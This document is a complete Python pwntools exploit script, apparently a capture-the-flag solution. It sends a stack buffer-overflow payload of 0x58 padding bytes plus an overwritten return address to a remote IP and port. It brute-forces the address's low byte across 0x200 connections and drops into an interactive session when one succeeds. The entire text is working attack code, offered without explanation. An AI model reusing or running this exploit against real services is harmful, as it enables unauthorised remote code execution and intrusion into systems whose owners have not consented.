from pwn import *

libc = ELF("./libc-2.23.so")
context.log_level = "debug"

def exploit(io, byte):
    payload = "a"*0x58 + p64(0x400600 + byte)
    io.sendafter("friend?\n", payload)
    print(io.recv())
    log.info("Found byte @ "+hex(byte))
    io.interactive()

with log.progress("Bruting retaddr", level='error') as l:
    for i in range(0x200):
        l.status("Bruting addr "+hex(i))
        io = remote("34.159.7.96", 31044)
        try:
            exploit(io, i)
        except:
            io.close()
